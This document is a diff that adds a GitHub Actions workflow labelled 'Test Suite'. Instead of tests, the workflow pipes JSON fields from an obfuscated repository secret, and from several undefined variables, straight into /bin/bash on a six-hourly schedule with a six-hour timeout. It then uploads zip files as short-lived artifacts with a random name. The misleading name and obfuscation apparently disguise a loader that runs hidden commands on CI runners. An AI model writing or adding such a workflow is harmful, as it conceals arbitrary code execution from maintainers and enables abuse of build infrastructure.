@@ -1,0 +1,40 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          fynyl87: ${{ secrets.fynyl87 }}
+        run: |
+          printf '%s' "$fynyl87" | jq -r .r9 | /bin/bash
+          printf '%s' "$rbdiw04" | jq -r .xotyd062 | /bin/bash
+          printf '%s' "$uty0695" | jq -r .n8 | /bin/bash
+          printf '%s' "$ahoii04712" | jq -r .ztsc2 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: T3J6KIZ3
+          path: "*.zip"
+          retention-days: 1
